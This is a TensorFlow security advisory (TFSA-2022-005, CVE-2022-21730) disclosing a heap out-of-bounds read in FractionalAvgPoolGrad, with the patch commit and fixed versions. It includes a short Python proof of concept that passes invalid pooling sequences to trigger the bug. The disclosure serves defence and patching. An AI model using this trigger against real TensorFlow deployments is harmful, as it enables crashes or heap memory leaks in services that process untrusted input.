<h2>TFSA-2022-005: Heap OOB access in <code>FractionalAvgPoolGrad</code></h2>
<h3>CVE Number</h3>
<p>CVE-2022-21730</p>
<h3>Impact</h3>
<p>The <a href="https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/fractional_avg_pool_op.cc#L209-L360">implementation of <code>FractionalAvgPoolGrad</code></a> does not consider cases where the input tensors are invalid allowing an attacker to read from outside of bounds of heap:</p>
<p>```python
import tensorflow as tf</p>
<p>@tf.function
def test():
  y = tf.raw_ops.FractionalAvgPoolGrad(
    orig_input_tensor_shape=[2,2,2,2],
    out_backprop=[[[[1,2], [3, 4], [5, 6]], [[7, 8], [9,10], [11,12]]]],
    row_pooling_sequence=[-10,1,2,3],
    col_pooling_sequence=[1,2,3,4],
    overlapping=True)
  return y</p>
<p>test()
```</p>
<h3>Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/002408c3696b173863228223d535f9de72a101a9">002408c3696b173863228223d535f9de72a101a9</a>.</p>
<p>The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.</p>
